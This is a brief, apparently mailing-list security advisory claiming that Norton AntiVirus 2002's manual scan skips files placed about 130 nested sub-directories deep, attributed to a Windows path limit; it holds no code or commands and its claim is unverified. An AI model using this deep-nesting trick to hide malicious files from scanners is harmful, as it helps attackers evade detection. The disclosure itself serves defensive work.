Norton AntiVirus nested file manual scan bypass.....

Product Version: Norton Antivirus 2002 (~Only tested On...~)
Risk Impact: Medium
Vendor Status: No responce!

Summary:

If you manage to inject a file in the sub-directory(s); beyond windows OS can create normally, [ say in 130 'th + sub-directory at c:\..\..\..\....upto 130'th ... ] NAV fails to scan the NESTED FILE. Indeed, it's more a windows restriction in accesing the nested file than a ANTIVIRUS flaw. Other antivirus product should also suffer the same. *.PLEASE VERIFY.* NAV
